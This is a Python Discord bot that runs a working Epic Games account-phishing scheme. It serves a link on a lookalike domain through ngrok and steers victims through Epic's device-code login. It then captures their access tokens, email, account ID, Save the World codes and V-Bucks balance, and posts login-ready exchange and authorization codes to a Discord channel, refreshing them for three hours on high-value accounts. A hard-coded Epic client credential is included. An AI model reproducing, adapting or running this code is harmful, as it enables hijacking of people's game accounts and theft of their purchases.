#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Discord Bot for Epic Games Authentication with a custom domain, 3-hour refresh, and V-Bucks checking.
- Last Updated: 2025-11-20 02:43:28
"""

# --- SETUP AND INSTALLATION ---
import os
import sys
import subprocess
import requests
import zipfile
import stat
import platform
import time

def run_setup():
    """Ensures all dependencies and ngrok are installed before starting."""
    print("--- Starting initial setup ---")
    
    # Check for discord.py
    try:
        import discord
        print("1/3: discord.py is already installed.")
    except ImportError:
        print("1/3: discord.py not found. Installing...")
        try:
            subprocess.check_call([sys.executable, "-m", "pip", "install", "discord.py"])
            print("     discord.py installed successfully.")
        except Exception as e:
            print(f"     ERROR: Failed to install discord.py: {e}", file=sys.stderr)
            sys.exit(1)

    ngrok_path = os.path.join(os.getcwd(), "ngrok")
    if not os.path.exists(ngrok_path):
        try:
            print("2/3: Downloading and installing ngrok...")
            machine, system = platform.machine().lower(), platform.system().lower()
            ngrok_url = "https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-amd64.zip"
            if system == "linux" and ("aarch64" in machine or "arm64" in machine):
                ngrok_url = "https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-arm64.zip"
            elif system == "darwin":
                 ngrok_url = f"https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-darwin-{'arm64' if 'arm' in machine else 'amd64'}.zip"
            elif system == "windows":
                ngrok_url = "https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-windows-amd64.zip"


            with requests.get(ngrok_url, stream=True) as r:
                r.raise_for_status()
                with open("ngrok.zip", "wb") as f:
                    for chunk in r.iter_content(chunk_size=8192): f.write(chunk)
            
            with zipfile.ZipFile("ngrok.zip", "r") as zip_ref: zip_ref.extractall(".")
            os.remove("ngrok.zip")
            if system != "windows":
                os.chmod(ngrok_path, os.stat(ngrok_path).st_mode | stat.S_IEXEC)
            print("     ngrok installed successfully.")
        except Exception as e:
            print(f"     ERROR: Failed to download or set up ngrok: {e}", file=sys.stderr)
            sys.exit(1)
    else:
        print("2/3: ngrok is already installed.")

    authtoken = os.getenv("NGROK_AUTHTOKEN")
    if authtoken:
        try:
            print("3/3: Configuring ngrok authtoken...")
            subprocess.check_call([ngrok_path, "config", "add-authtoken", authtoken], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            print("     ngrok authtoken configured.")
        except Exception as e:
            print(f"     WARNING: Failed to configure ngrok authtoken: {e}", file=sys.stderr)
    else:
        print("3/3: NGROK_AUTHTOKEN not set, skipping configuration. This is required for custom domains.")
    print("--- Setup complete ---")

run_setup()

# --- MAIN APPLICATION IMPORTS ---
import logging
import asyncio
import threading
from datetime import datetime
import http.server
import socketserver
import uuid
import traceback
import aiohttp
import discord
from discord.ext import commands

# ==============================================================================
# --- CONFIGURATION AND GLOBALS ---
# ==============================================================================
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger("rift_checker_bot")

DISCORD_BOT_TOKEN = os.getenv("DISCORD_BOT_TOKEN")
if not DISCORD_BOT_TOKEN:
    logger.critical("❌ DISCORD_BOT_TOKEN environment variable is not set. The bot cannot start.")
    sys.exit(1)

# Custom domain configuration
CUSTOM_DOMAIN = "help.id-epicgames.com"
REFRESH_INTERVAL = 180 

ngrok_ready = threading.Event()
permanent_link = None
PERMANENT_LINK_ID = str(uuid.uuid4())[:13] # A unique path to avoid conflicts

verification_uses = 0
active_sessions = {}
session_lock = threading.Lock()

intents = discord.Intents.default()
intents.guilds = True
bot = commands.Bot(command_prefix="!", intents=intents)
bot.remove_command('help')

# ==============================================================================
# --- EPIC AUTHENTICATION LOGIC ---
# ==============================================================================
async def create_epic_auth_session():
    EPIC_TOKEN = "OThmN2U0MmMyZTNhNGY4NmE3NGViNDNmYmI0MWVkMzk6MGEyNDQ5YTItMDAxYS00NTFlLWFmZWMtM2U4MTI5MDFjNGQ3"
    async with aiohttp.ClientSession() as sess:
        async with sess.post("https://account-public-service-prod.ol.epicgames.com/account/api/oauth/token", headers={"Authorization": f"basic {EPIC_TOKEN}", "Content-Type": "application/x-www-form-urlencoded"}, data={"grant_type": "client_credentials"}) as r:
            r.raise_for_status()
            token_data = await r.json()
        async with sess.post("https://account-public-service-prod03.ol.epicgames.com/account/api/oauth/deviceAuthorization", headers={"Authorization": f"bearer {token_data['access_token']}", "Content-Type": "application/x-www-form-urlencoded"}) as r:
            r.raise_for_status()
            dev_auth = await r.json()
    return {'activation_url': f"https://www.epicgames.com/id/activate?userCode={dev_auth['user_code']}", 'device_code': dev_auth['device_code'], 'interval': dev_auth.get('interval', 5), 'expires_in': dev_auth.get('expires_in', 600)}

async def get_exchange_code(access_token):
    try:
        async with aiohttp.ClientSession() as sess:
            async with sess.get("https://account-public-service-prod03.ol.epicgames.com/account/api/oauth/exchange", headers={"Authorization": f"bearer {access_token}"}) as r:
                if r.status == 200: return (await r.json())['code']
    except Exception: return None

async def get_authorization_code(access_token):
    try:
        async with aiohttp.ClientSession() as sess:
            async with sess.get("https://www.epicgames.com/id/api/redirect", headers={"Authorization": f"bearer {access_token}"}, allow_redirects=False) as r:
                if r.status == 200: return (await r.json()).get("authorizationCode")
    except Exception: return None

async def get_stw_codes(access_token, account_id):
    platforms, all_codes, headers = ['epic', 'xbox', 'psn'], [], {"Authorization": f"Bearer {access_token}"}
    async with aiohttp.ClientSession() as sess:
        for platform in platforms:
            url = f"https://fngw-mcp-gc-livefn.ol.epicgames.com/fortnite/api/game/v2/friendcodes/{account_id}/{platform}"
            try:
                async with sess.get(url, headers=headers) as r:
                    if r.status == 200 and (codes := await r.json()):
                        all_codes.extend([f"{platform.upper()}: `{code['codeId']}`" for code in codes])
            except Exception: pass
    return all_codes

async def get_vbucks_balance(access_token, account_id):
    headers = {"Authorization": f"Bearer {access_token}", "Content-Type": "application/json"}
    url = f"https://fortnite-public-service-prod11.ol.epicgames.com/fortnite/api/game/v2/profile/{account_id}/client/QueryProfile?profileId=common_core"
    try:
        async with aiohttp.ClientSession() as sess:
            async with sess.post(url, headers=headers, json={}) as r:
                if r.status == 200:
                    items = (await r.json()).get('profileChanges', [{}])[0].get('profile', {}).get('items', {})
                    for item_data in items.values():
                        if item_data.get('templateId') == 'Currency:MtxPurchased': return item_data.get('quantity', 0)
    except Exception: pass
    return 0

async def auto_refresh_session(session_id, user_ip):
    try:
        with session_lock:
            session = active_sessions.get(session_id)
            if not session: return
            display_name, session_expiry_time, is_high_value = session['account_info'].get('displayName', 'Unknown'), session['expires_at'], session.get('vbucks', 0) > 5000
        logger.info(f"[{session_id}] 🔄 Auto-refresh STARTED for {display_name}. High Value: {is_high_value}.")

        while time.time() < session_expiry_time:
            await asyncio.sleep(REFRESH_INTERVAL)
            with session_lock:
                if not (session := active_sessions.get(session_id)) or session['status'] == 'expired': break
                current_access_token = session['access_token']
            new_exchange_code = await get_exchange_code(current_access_token)
            new_auth_code = await get_authorization_code(current_access_token) if is_high_value else None
            if new_exchange_code:
                with session_lock:
                    if not (session := active_sessions.get(session_id)): break
                    session['refresh_count'] += 1
                logger.info(f"[{session_id}] ✅ REFRESHED for {display_name} (Refresh #{session['refresh_count']})")
                await edit_bot_message(session_id, new_exchange_code=new_exchange_code, new_auth_code=new_auth_code)
    except asyncio.CancelledError: pass
    finally:
        with session_lock:
            if session_id in active_sessions:
                active_sessions[session_id]['status'] = 'expired'
                bot.loop.create_task(edit_bot_message(session_id, status='expired'))

def monitor_epic_auth_sync(device_code, interval, expires_in, user_ip, channel_id):
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    try: loop.run_until_complete(monitor_epic_auth(device_code, interval, expires_in, user_ip, channel_id))
    finally: loop.close()

async def monitor_epic_auth(device_code, interval, expires_in, user_ip, channel_id):
    EPIC_TOKEN = "OThmN2U0MmMyZTNhNGY4NmE3NGViNDNmYmI0MWVkMzk6MGEyNDQ5YTItMDAxYS00NTFlLWFmZWMtM2U4MTI5MDFjNGQ3"
    try:
        async with aiohttp.ClientSession() as sess:
            deadline = time.time() + expires_in
            while time.time() < deadline:
                await asyncio.sleep(interval)
                async with sess.post("https://account-public-service-prod.ol.epicgames.com/account/api/oauth/token", headers={"Authorization": f"basic {EPIC_TOKEN}", "Content-Type": "application/x-www-form-urlencoded"}, data={"grant_type": "device_code", "device_code": device_code}) as r:
                    if r.status != 200 or "access_token" not in (token_resp := await r.json()): continue
                    logger.info(f"✅ USER LOGGED IN!")
                    access_token, account_id = token_resp['access_token'], token_resp['account_id']
                    async with sess.get(f"https://account-public-service-prod03.ol.epicgames.com/account/api/public/account/{account_id}", headers={"Authorization": f"bearer {access_token}"}) as r_acc: account_info = await r_acc.json()
                    exchange_code = await get_exchange_code(access_token)
                    stw_codes = await get_stw_codes(access_token, account_id)
                    vbucks = await get_vbucks_balance(access_token, account_id) if not stw_codes else 0
                    auth_code = await get_authorization_code(access_token) if vbucks > 5000 else None
                    session_id = str(uuid.uuid4())[:8]
                    with session_lock:
                        active_sessions[session_id] = {
                            'access_token': access_token, 'account_info': account_info, 'user_ip': user_ip, 'created_at': time.time(),
                            'last_refresh': time.time(), 'refresh_count': 0, 'expires_at': time.time() + 10800, 'status': 'active',
                            'message_id': None, 'channel_id': channel_id, 'stw_codes': stw_codes, 'vbucks': vbucks
                        }
                    bot.loop.create_task(send_new_login_message(session_id, exchange_code, auth_code))
                    bot.loop.create_task(auto_refresh_session(session_id, user_ip))
                    return
    except Exception as e: logger.error(f"❌ Monitoring error: {e}\n{traceback.format_exc()}")

# ==============================================================================
# --- DISCORD BOT LOGIC ---
# ==============================================================================
async def send_new_login_message(session_id, initial_exchange_code, initial_auth_code):
    with session_lock:
        if not (session := active_sessions.get(session_id)): return
        channel_id = session['channel_id']
    if not (channel := bot.get_channel(channel_id)): return
    embed = build_embed(session_id, initial_exchange_code, initial_auth_code)
    try:
        message = await channel.send(embed=embed)
        with session_lock:
            if (session := active_sessions.get(session_id)): session['message_id'] = message.id
    except Exception as e: logger.error(f"Failed to send initial login message: {e}")

async def edit_bot_message(session_id, new_exchange_code=None, new_auth_code=None, status=None):
    with session_lock:
        if not (session := active_sessions.get(session_id)) or not session.get('message_id'): return
        channel_id, message_id = session['channel_id'], session['message_id']
    if not (channel := bot.get_channel(channel_id)): return
    try:
        message = await channel.fetch_message(message_id)
        embed = build_embed(session_id, new_exchange_code, new_auth_code, status_override=status)
        await message.edit(embed=embed)
    except Exception: pass

def build_embed(session_id, exchange_code=None, auth_code=None, status_override=None):
    with session_lock:
        if not (session := active_sessions.get(session_id)): return discord.Embed(title="Error", color=discord.Color.red())
        status, vbucks = status_override or session['status'], session.get('vbucks', 0)
    display_name = session['account_info'].get('displayName', 'N/A')
    if status == 'active': title, color, desc = f"✅ User Logged In: {display_name}", discord.Color.green(), f"**{display_name}** has verified!\n\n🔄 *Session refreshing for 3 hours.*"
    elif status == 'expired': title, color, desc = f"🔚 Session Expired: {display_name}", discord.Color.greyple(), f"3-hour refresh window for **{display_name}** has ended."
    else: title, color, desc = f"🔄 Refreshed: {display_name}", discord.Color.blue(), f"New codes generated for **{display_name}**!"
    if vbucks > 5000: title = f"💎 {title}"
    embed = discord.Embed(title=title, description=desc, color=color, timestamp=datetime.utcnow())
    embed.add_field(name="Display Name", value=display_name, inline=True).add_field(name="Email", value=session['account_info'].get('email', 'N/A'), inline=True)
    embed.add_field(name="Account ID", value=f"`{session['account_info'].get('id', 'N/A')}`", inline=False)
    if session['stw_codes']: embed.add_field(name="🔑 Save The World Codes", value="\n".join(session['stw_codes']), inline=False)
    else: embed.add_field(name="<:vbucks:1234567890> V-Bucks Balance", value=f"**{vbucks:,}**", inline=False)
    if exchange_code:
        embed.add_field(name="🔗 Direct Login Link", value=f"**[Click to login](https://www.epicgames.com/id/exchange?exchangeCode={exchange_code}&redirectUrl=https%3A%2F%2Flauncher.store.epicgames.com%2Fsite%2Faccount)**", inline=False)
        embed.add_field(name="Exchange Code", value=f"```{exchange_code}```", inline=False)
    if auth_code: embed.add_field(name="🔐 Authorization Code", value=f"```{auth_code}```", inline=False)
    footer = f"Refreshes: {session['refresh_count']}" if status != 'expired' else f"Session completed after {session['refresh_count']} refreshes."
    embed.set_footer(text=footer)
    return embed

@bot.event
async def on_ready():
    global permanent_link
    permanent_link = f"https://{CUSTOM_DOMAIN}/verify/{PERMANENT_LINK_ID}"
    logger.info(f"✅ Bot is online as {bot.user}")
    threading.Thread(target=run_web_server, args=(8000,), daemon=True).start()
    threading.Thread(target=setup_ngrok_tunnel, args=(8000,), daemon=True).start()
    if not ngrok_ready.wait(timeout=20):
        logger.critical("❌ Timed out waiting for ngrok. Exiting."); await bot.close(); return
    logger.info(f"🔗 Verification link is ready: {permanent_link}")
    for guild in bot.guilds: await on_guild_join(guild)

@bot.event
async def on_guild_join(guild):
    target_channel = discord.utils.get(guild.text_channels, name="rift-auth")
    if not target_channel:
        try: target_channel = await guild.create_text_channel("rift-auth")
        except discord.Forbidden: return
    embed = discord.Embed(title="🚀 Rift Authentication Bot", description=f"**Click the link below to authenticate.**\n\n`{permanent_link}`", color=discord.Color.purple())
    await target_channel.send(embed=embed)

# ==============================================================================
# --- WEB SERVER AND NGROK ---
# ==============================================================================
class RequestHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        global verification_uses
        path_parts = self.path.strip("/").split("/")
        if len(path_parts) == 2 and path_parts[0] == 'verify' and path_parts[1] == PERMANENT_LINK_ID:
            verification_uses += 1
            client_ip = self.headers.get('X-Forwarded-For', self.client_address[0])
            try:
                loop = asyncio.new_event_loop()
                epic_session = loop.run_until_complete(create_epic_auth_session())
                loop.close()
                default_channel_id = bot.guilds[0].text_channels[0].id
                threading.Thread(target=monitor_epic_auth_sync, args=(epic_session['device_code'], epic_session['interval'], epic_session['expires_in'], client_ip, default_channel_id), daemon=True).start()
                self.send_response(302)
                self.send_header('Location', epic_session['activation_url'])
                self.end_headers()
            except Exception as e: logger.error(f"❌ Error during auth session creation: {e}"); self.send_error(500)
        else: self.send_error(404); self.end_headers()
            
    def log_message(self, format, *args): pass

def run_web_server(port):
    with socketserver.ThreadingTCPServer(("", port), RequestHandler) as httpd: httpd.serve_forever()

def setup_ngrok_tunnel(port):
    """Starts ngrok with a custom domain."""
    ngrok_executable = os.path.join(os.getcwd(), "ngrok.exe" if platform.system() == "windows" else "ngrok")
    if not os.getenv("NGROK_AUTHTOKEN"):
        logger.warning("NGROK_AUTHTOKEN not found. Custom domain may not work.")

    logger.info(f"🌐 Starting ngrok tunnel for {CUSTOM_DOMAIN}...")
    command = [ngrok_executable, 'http', str(port), f'--domain={CUSTOM_DOMAIN}']
    
    try:
        # Start ngrok and let it run in the background
        subprocess.Popen(command, stdout=subprocess.DEVNULL, stderr=subprocess.PIPE)
        time.sleep(5) # Give ngrok a moment to establish the tunnel
        
        # We assume it works if the command starts. The user must ensure DNS is correct.
        logger.info(f"✅ ngrok tunnel should be live at https://{CUSTOM_DOMAIN}")
        ngrok_ready.set()
    except FileNotFoundError:
        logger.critical(f"❌ Ngrok executable not found at '{ngrok_executable}'. Please check the path.")
        sys.exit(1)
    except Exception as e: 
        logger.critical(f"❌ Failed to start ngrok with custom domain: {e}"); sys.exit(1)

if __name__ == "__main__":
    try:
        bot.run(DISCORD_BOT_TOKEN)
    except discord.LoginFailure:
        logger.critical("❌ Login failed: Invalid Discord Bot Token.")
    except Exception as e:
        logger.critical(f"❌ An error occurred while running the bot: {e}")
